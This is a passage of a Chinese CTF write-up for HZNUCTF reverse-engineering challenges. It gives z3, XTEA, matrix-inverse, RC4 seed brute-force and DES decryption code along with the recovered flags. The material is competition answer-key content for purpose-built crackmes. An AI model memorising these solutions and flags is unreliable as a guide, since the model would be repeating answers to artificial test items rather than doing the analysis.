Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] == 6893)\ns.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] == 1883)\ns.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] == 8257)\ns.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] == 5847)\ns.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] == 18257)\ns.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] == 12591)\ns.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] == 52041)\ns.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] == 20253)\ns.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] == 18768)\ns.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] == 111844)\ns.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] == 159029)\ns.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] == 2762025)\ns.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] == 1551621)\ns.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] == 948348)\ns.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] == 777044)\ns.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] == 185016)\ns.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] == 130106)\n\nfor x in Enc:\n    s.add(x >= 32)\n    s.add(x <= 126)\n\nif s.check() == sat:\n    m = s.model()\n\n    solution = [m[x].as_long() if m[x] is not None else 0 for x in Enc]\n    \n    decrypted = decrypt(solution)\n    print(decrypted)\n    \nelse:\n    print(\"No solution found\")\n```\n\nHZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}\n\n### XTEA\n\n初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。\n\n红框处是将输入字符串四个四个一组进行翻转。\n\n![img](/images/1744633170177-8.png)\n\nInitKey函数是用rand初始化了四个整数Key。\n\n![img](/images/1744633170177-9.png)\n\nXTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。\n\n![img](/images/1744633170177-10.png)\n\n题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，**2654435769 -> 0x9E3779B9**\n\n直接编写解密，使用该Delta就可以解出flag。\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nunsigned int *__fastcall dec(int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)\n{\n    unsigned int *result; // rax\n    unsigned int v5;      // [rsp+24h] [rbp+4h]\n    unsigned int v6;      // [rsp+44h] [rbp+24h]\n    unsigned int v7;      // [rsp+64h] [rbp+44h]\n    int i;                // [rsp+84h] [rbp+64h]\n\n    v5 = *a2;\n    v6 = *a3;\n    v7 = 0;\n    v7 = -a1 * 32;\n    for (i = 0; i < 32; ++i)\n    {\n        v6 -= (*(DWORD *)(a4 + 4LL * ((v7 >> 11) & 3)) + v7) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));\n        v7 += a1;\n        v5 -= (*(DWORD *)(a4 + 4LL * (v7 & 3)) + v7) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));\n    }\n    *a2 = v5;\n    result = a3;\n    *a3 = v6;\n    return result;\n}\n\nint main()\n{\n    unsigned char buffer[] = {\n        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,\n        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,\n        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,\n        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17};\n    srand(0x7e8);\n    // 初始化Key\n    uint32_t key[4]{};\n    for (int i = 0; i < 4; i++)\n        key[i] = rand();\n\n    for (int j = 7; j > 0; j--)\n        dec(0x9E3779B9, (unsigned int *)(buffer + (j - 1) * 4), (unsigned int *)(buffer + j * 4), (uint32_t)key);\n\n    // 四个字节一组进行翻转\n    for (int j = 0; j < 32; j += 4)\n    {\n        auto tmp = *((char *)buffer + j + 3) | (*((char *)buffer + j + 2) << 8) | (*((char *)buffer + j + 1) << 16) | (*((char *)buffer + j) << 24);\n        *(int *)(buffer + j) = tmp;\n    }\n    printf(\"%.32s\\n\", buffer);\n\n    return 0;\n}\n```\n\nHZNUCTF{ae6-9f57-4b74-b423-98eb}\n\n### randomsystem\n\n第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。\n\n如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符'5','2','6','5'。\n\n![img](/images/1744633170177-11.png)\n\n根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。\n\n```\n0101001001100101010101100110010101010010011001010101001101100101\n```\n\n底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。\n\n第一部分用固定种子的随机数初始化了一个v18数值列表。\n\n![img](/images/1744633170177-12.png)\n\n然后进行四次加密。\n\n![img](/images/1744633170177-13.png)\n\nEnc1是用随机数初始化的列表进行打乱输入字符串的顺序。\n\n![img](/images/1744633170177-14.png)\n\nEnc2是将输入字符串转存到另一个二维数组。\n\n![img](/images/1744633170177-15.png)\n\n第三个函数是将之前输入转换后的Key存到\"Str\"中，实际值就是**ReVeReSe**\n\n第四个函数是用一个全局的矩阵乘上输入数据。\n\n![img](/images/1744633170178-16.png)\n\n最后和Key进行循环异或加密。\n\n![img](/images/1744633170178-17.png)\n\n所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。\n\nEnc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nvoid Enc1(char *Str, int *RdList)\n{\n    char v3;   // [esp+D3h] [ebp-1Dh]\n    size_t i;  // [esp+DCh] [ebp-14h]\n    size_t v5; // [esp+E8h] [ebp-8h]\n\n    v5 = 64;\n    for (i = 0;; ++i)\n    {\n        auto result = v5 >> 1;\n        if (i >= v5 >> 1)\n            break;\n        if (RdList[i] >= 0 && RdList[i] < v5)\n        {\n            v3 = Str[i];\n            Str[i] = Str[v5 - RdList[i] - 1];\n            Str[v5 - RdList[i] - 1] = v3;\n        }\n    }\n}\n\nvoid Enc2(char *a1, char *a2)\n{\n    int j;  // [esp+D0h] [ebp-20h]\n    int i;  // [esp+DCh] [ebp-14h]\n    int v4; // [esp+E8h] [ebp-8h]\n\n    v4 = 0;\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n            *&a1[32 * i + 4 * j] = a2[v4++];\n    }\n}\n\nunsigned int dword_3FC368[] = {\n    0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000,\n    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000001, 0x00000000,\n    0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000,\n    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000001,\n    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001};\n\nint inv[] = {\n    1,-4,1,-2,0,5,-2,3,\n    0,3,-1,1,0,-3,1,-2,\n    0,-2,1,-1,0,2,-1,2,\n    0,0,0,1,0,-1,0,0,\n    0,-4,1,-1,1,4,-2,3,\n    0,1,0,0,0,0,0,-1,\n    0,1,0,0,0,-1,1,-1,\n    0,-1,0,0,0,1,0,1,\n};\n\nint Enc3(int *a1, char *a2, char *a3)\n{\n    int result; // eax\n    int k;      // [esp+D0h] [ebp-20h]\n    int j;      // [esp+DCh] [ebp-14h]\n    int i;      // [esp+E8h] [ebp-8h]\n\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n        {\n            a3[32 * i + 4 * j] = 0;\n            for (k = 0; k < 8; ++k)\n                a3[32 * i + 4 * j] += *&a2[32 * k + 4 * j] * a1[8 * i + k];\n        }\n        result = i + 1;\n    }\n    return result;\n}\n\nvoid Dec2(char *a1, char *a2)\n{\n    int j;\n    int i;\n    int v4;\n\n    v4 = 0;\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n            a2[v4++] = a1[32 * i + 4 * j];\n    }\n}\n\nunsigned char EncFlag[256] = {\n    0x78, 0x01, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0xA9, 0x00, 0x00, 0x00, 0xF5, 0x01, 0x00, 0x00,\n    0x15, 0x01, 0x00, 0x00, 0x49, 0x01, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00,\n    0x7C, 0x01, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,\n    0x7D, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00, 0x5B, 0x01, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00,\n    0x07, 0x01, 0x00, 0x00, 0x67, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0xE4, 0x01, 0x00, 0x00,\n    0x36, 0x01, 0x00, 0x00, 0x4D, 0x01, 0x00, 0x00, 0x5A, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00,\n    0x96, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x58, 0x01, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xFA, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xAD, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x7B, 0x01, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00,\n    0xC5, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xC5, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,\n    0xC6, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0xCF, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,\n    0xCA, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,\n    0xC1, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xB5, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x61, 0x01, 0x00, 0x00,\n    0x99, 0x00, 0x00, 0x00, 0x65, 0x01, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00};\n\nint main()\n{\n    // First: 0101001001100101010101100110010101010010011001010101001101100101\n    srand(2025);\n    int RdList[0x80]{};\n    bool v16 = true;\n    int rd{};\n    for (int i = 0; i < 32; i++)\n    {\n        do\n        {\n            rd = rand() % 32;\n            rd &= 0x8000001F;\n            v16 = 1;\n            for (int j = 0; j < i; j++)\n            {\n                if (RdList[j] == rd)\n                {\n                    v16 = 0;\n                    break;\n                }\n            }\n        } while (!v16);\n        RdList[i] = rd;\n    }\n\n    char Key[] = \"ReVeReSe\";\n    int count = 0;\n    for (int i = 0; i < 256; i += 4)\n    {\n        *(DWORD *)(EncFlag + i) ^= Key[count % 8];\n        count++;\n    }\n    unsigned char Buffer_Dec[256]{};\n\n    Enc3((int *)inv, (char *)EncFlag, (char *)Buffer_Dec);\n    Dec2((char *)Buffer_Dec, (char *)Buffer_Dec);\n    Enc1((char *)Buffer_Dec, RdList);\n\n    printf(\"HZNUCTF{%.64s}\\n\", Buffer_Dec);\n    return 0;\n}\n```\n\nHZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}\n\n### conforand（非预期）\n\n从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。\n\n![img](/images/1744633170178-18.png)\n\n![img](/images/1744633170178-19.png)\n\n查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。\n\n![img](/images/1744633170178-20.png)\n\n那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。\n\n接下来是先检验加密对称性，运行发现是会输出加密后的内容。\n\n检验步骤：\n\n1. 随便输入一串字符串\n2. 断点rand，修改rand返回值rax寄存器为0。\n3. 得到输出加密内容。\n4. 再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。\n5. 断点rand，修改rand返回值rax寄存器为0。\n6. 观察输出加密内容是否为原字符串数据。\n\nPatch前：\n\n![img](/images/1744633170178-21.png)\n\nPatch后：\n\n![img](/images/1744633170178-22.png)\n\n发现是对称的，同一个rand值，加密函数也可以用于解密。\n\n![img](/images/1744633170178-23.png)\n\n![img](/images/1744633170178-24.png)\n\n开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。\n\n将rand调用改成jmp到init函数。\n\n![img](/images/1744633170178-25.png)\n\ninit函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。\n\n![img](/images/1744633170178-26.png)\n\n这边使用这个库加载elf进行调用call：https://github.com/IchildYu/load-elf （河豚鱼，神）\n\n爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：\n\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include \"include/load_elf.h\"\n#include \"include/logger.h\"\n#include \"include/breakpoint.h\"\n\nint main() \n{\n        const char* path = \"./conforand\";\n        void* base = load_elf(path);\n\n        __uint64_t  (*rc4)(unsigned char*, unsigned long long, unsigned char*, unsigned long long) = get_symbol_by_offset(base,0x413170);\n\n        unsigned char key[]=\"JustDoIt!\";\n\n        for(int i=0; i<1000000; i++)\n        {\n                unsigned char EncData[]={0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f};\n\n                *(unsigned int*)(0x4068D3) = i;\n\n                rc4(EncData,42,key,9);\n                \n                if(EncData[0] == 'H' \n                        && EncData[1] == 'Z'\n                        && EncData[2] == 'N')\n                {\n                        printf(\"Seed:%d\\n\",i);\n                        printf(\"%.42s\\n\",EncData);\n                        break;\n                }\n        }\n        return 0;\n}\n```\n\n![img](/images/1744633170178-27.png)\n\nHZNUCTF{489b88-1305-411e-b1f4-88a3070a73}\n\n### exchange\n\n输入的字符串经过unhex、拆分字节，改变顺序。\n\n如：**11**->**0x31 0x31**->**'3' '1' '3' '1'**->**'3' '3' '1' '1'**\n\n是两个字节为一组进行变换的。\n\n然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**\"HZNUCTF{\"**字串。\n\n![img](/images/1744633170178-28.png)\n\n主加密函数，发现只走这上面的部分。\n\n![img](/images/1744633170178-29.png)\n\n第一个函数是用**\"HZNUCTF{\"**字串生成的一串数据，64个整数数据。\n\n第二个函数是将输入数据8个字节为一组进行加密。\n\n加密流程：\n\n1. 4个字节为一组进行翻转\n2. 8字节加密\n3. 4个字节为一组进行翻转\n\n![img](/images/1744633170178-30.png)\n\n加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。\n\n![img](/images/1744633170178-31.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nunsigned int s1[64] = {\n    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404, 0x00000004, 0x00010000,\n    0x00000400, 0x01010400, 0x01010404, 0x00000400, 0x01000404, 0x01010004, 0x01000000, 0x00000004,\n    0x00000404, 0x01000400, 0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,\n    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404, 0x00010404, 0x01000000,\n    0x00010000, 0x01010404, 0x00000004, 0x01010000, 0x01010400, 0x01000000, 0x01000000, 0x00000400,\n    0x01010004, 0x00010000, 0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,\n    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404, 0x00010404, 0x01010400,\n    0x00000404, 0x01000400, 0x01000400, 0x00000000, 0x00010004, 0x00010400, 0x00000000, 0x01010004};\nunsigned int s2[64] = {\n    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020, 0x80100020, 0x80008020,\n    0x80000020, 0x80108020, 0x80108000, 0x80000000, 0x80008000, 0x00100000, 0x00000020, 0x80100020,\n    0x00108000, 0x00100020, 0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,\n    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000, 0x80100000, 0x00008020,\n    0x00000000, 0x00108020, 0x80100020, 0x00100000, 0x80008020, 0x80100000, 0x80108000, 0x00008000,\n    0x80100000, 0x80008000, 0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,\n    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020, 0x80000020, 0x00100020,\n    0x00108000, 0x00000000, 0x80008000, 0x00008020, 0x80000000, 0x80100020, 0x80108020, 0x00108000};\nunsigned int s3[64] = {\n    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000, 0x00020208, 0x08000200,\n    0x00020008, 0x08000008, 0x08000008, 0x00020000, 0x08020208, 0x00020008, 0x08020000, 0x00000208,\n    0x08000000, 0x00000008, 0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,\n    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208, 0x00000200, 0x08000000,\n    0x08020200, 0x08000000, 0x00020008, 0x00000208, 0x00020000, 0x08020200, 0x08000200, 0x00000000,\n    0x00000200, 0x00020008, 0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,\n    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208, 0x00020200, 0x08000008,\n    0x08020000, 0x08000208, 0x00000208, 0x08020000, 0x00020208, 0x00000008, 0x08020008, 0x00020200};\nunsigned int s4[64] = {\n    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081, 0x00800001, 0x00002001,\n    0x00000000, 0x00802000, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00800080, 0x00800001,\n    0x00000001, 0x00002000, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,\n    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080, 0x00802081, 0x00000081,\n    0x00800080, 0x00800001, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00000000, 0x00802000,\n    0x00002080, 0x00800080, 0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,\n    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001, 0x00802080, 0x00800081,\n    0x00002001, 0x00002080, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002000, 0x00802080};\nunsigned int s5[64] = {\n    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100, 0x40000000, 0x02080000,\n    0x40080100, 0x00080000, 0x02000100, 0x40080100, 0x42000100, 0x42080000, 0x00080100, 0x40000000,\n    0x02000000, 0x40080000, 0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,\n    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000, 0x42000000, 0x00080100,\n    0x00080000, 0x42000100, 0x00000100, 0x02000000, 0x40000000, 0x02080000, 0x42000100, 0x40080100,\n    0x02000100, 0x40000000, 0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,\n    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000, 0x40080000, 0x42000000,\n    0x00080100, 0x02000100, 0x40000100, 0x00080000, 0x00000000, 0x40080000, 0x02080100, 0x40000100};\nunsigned int s6[64] = {\n    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010, 0x20404010, 0x00400000,\n    0x20004000, 0x00404010, 0x00400000, 0x20000010, 0x00400010, 0x20004000, 0x20000000, 0x00004010,\n    0x00000000, 0x00400010, 0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,\n    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000, 0x20404000, 0x20000000,\n    0x20004000, 0x00000010, 0x20400010, 0x00404000, 0x20404010, 0x00400000, 0x00004010, 0x20000010,\n    0x00400000, 0x20004000, 0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,\n    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000, 0x20400000, 0x00404010,\n    0x00004000, 0x00400010, 0x20004010, 0x00000000, 0x20404000, 0x20000000, 0x00400010, 0x20004010};\nunsigned int s7[64] = {\n    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 